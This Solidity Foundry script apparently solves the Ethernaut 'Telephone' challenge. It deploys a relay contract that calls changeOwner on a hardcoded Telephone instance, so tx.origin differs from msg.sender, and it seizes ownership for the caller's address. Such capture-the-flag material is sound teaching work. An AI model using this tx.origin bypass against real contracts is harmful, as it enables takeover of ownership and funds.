// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Telephone.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract OwnerContract {
    Telephone constant telephoneInstance =
        Telephone(0x17570Dc229045C0f57efFcea2d71B2ec80D48F54);

    function changeOwner(address _newOwner) external {
        telephoneInstance.changeOwner(_newOwner);
    }
}

contract TelephoneSolution is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        OwnerContract ownerContract = new OwnerContract();
        ownerContract.changeOwner(vm.envAddress("MY_ADDRESS"));
        vm.stopBroadcast();
    }
}
